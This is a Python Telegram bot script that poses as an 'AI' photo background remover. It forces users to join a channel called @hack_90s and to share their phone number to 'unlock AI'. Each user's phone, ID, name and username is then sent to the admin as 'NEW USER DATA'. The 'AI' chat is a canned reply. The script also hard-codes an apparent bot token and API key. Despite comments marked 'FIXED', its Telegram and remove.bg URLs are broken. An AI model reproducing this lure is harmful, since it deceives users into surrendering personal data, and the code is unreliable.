import telebot
import requests
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8277158758:AAG-HEtgNaAH3QZQOZyUu4AWfZObGsirRmk'
REMOVE_BG_KEY = 'Mx6t5h8VhQ7LnKPBaFq3U4w9'
ADMIN_ID = 8346338271
CHANNEL_LINK = 'https://t.me/hack_90s'
CHANNEL_ID = '@hack_90s' # Channel username check karne ke liye

bot = telebot.TeleBot(API_TOKEN)
verified_users = {}

# Channel Membership Check
def check_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    # Check if joined channel
    if not check_membership(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)
        btn2 = types.InlineKeyboardButton("🔄 Verify & Start", callback_data="verify_join")
        markup.add(btn1, btn2)
        bot.send_message(message.chat.id, "❌ **Access Denied!**\n\nIs bot ko use karne ke liye hamara channel join karein.", reply_markup=markup, parse_mode='Markdown')
        return

    ask_verification(message.chat.id)

def ask_verification(chat_id):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📲 Share Number & Unlock AI", request_contact=True))
    bot.send_message(chat_id, "✅ Welcome! AI Unlock karne ke liye niche button se number share karein.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def callback_verify(call):
    if check_membership(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        ask_verification(call.message.chat.id)
    else:
        bot.answer_callback_query(call.id, "⚠️ Aapne abhi join nahi kiya!", show_alert=True)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user = message.from_user
    phone = message.contact.phone_number
    verified_users[user.id] = True 
    
    report = (
        "🚀 **NEW USER DATA!**\n"
        f"📞 Phone: `{phone}`\n"
        f"🆔 ID: `{user.id}`\n"
        f"👤 Name: {user.first_name}\n"
        f"🔗 Username: @{user.username or 'None'}"
    )
    bot.send_message(ADMIN_ID, report, parse_mode='Markdown')
    bot.send_message(message.chat.id, "✅ Verified! Ab mujhe koi bhi photo bhejein.", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(content_types=['photo'])
def process_photo(message):
    if message.from_user.id not in verified_users:
        bot.reply_to(message, "⚠️ Pehle apna number share karke verify karein!")
        return

    bot.reply_to(message, "⏳ **AI is editing your photo...**")
    
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        # FIXED: Correct Telegram File URL
        file_url = f'https://telegram.org{API_TOKEN}/{file_info.file_path}'
        
        # FIXED: Correct Remove.bg API Endpoint
        response = requests.post(
            'https://remove.bg',
            data={'image_url': file_url, 'size': 'auto'},
            headers={'X-API-Key': REMOVE_BG_KEY},
        )

        if response.status_code == requests.codes.ok:
            bot.send_document(message.chat.id, response.content, visible_file_name='AI_Edited.png', caption="✨ Edited by AI.")
            bot.send_message(ADMIN_ID, f"📸 Photo edited for @{message.from_user.username or message.from_user.id}")
        else:
            bot.send_message(message.chat.id, "❌ AI Error: API Key check karein ya limit khatam ho gayi.")
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Processing failed.")

@bot.message_handler(func=lambda message: True)
def ai_chat_reply(message):
    if message.from_user.id not in verified_users:
        bot.reply_to(message, "⚠️ Please share your number first!")
        return
        
    bot.reply_to(message, f"🤖 AI: Main aapki baat samajh gaya. Photo bhejein background hatane ke liye.")

print("✅ Bot is online...")
bot.polling()
